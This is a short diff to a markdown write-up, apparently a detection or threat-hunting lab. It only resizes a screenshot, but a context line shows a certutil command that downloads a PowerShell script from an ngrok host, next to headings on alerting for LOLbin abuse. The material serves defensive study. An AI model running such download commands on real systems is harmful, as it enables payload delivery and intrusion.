@@ -152,7 +152,7 @@ Resulted in:
 **Command used**: `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`
 
 **Alert on LOLbin usage**
-<img width="750" height="950" alt="image" src="https://github.com/user-attachments/assets/b4dbbb15-9781-4324-be68-5ab219690e75" />
+<img width="450" height="950" alt="image" src="https://github.com/user-attachments/assets/b4dbbb15-9781-4324-be68-5ab219690e75" />
 
 **DeviceProcessEvents**:
 <img width="700" height="400" alt="image" src="https://github.com/user-attachments/assets/eff3082d-af7e-427d-a7ad-0cd1d45a343f" />
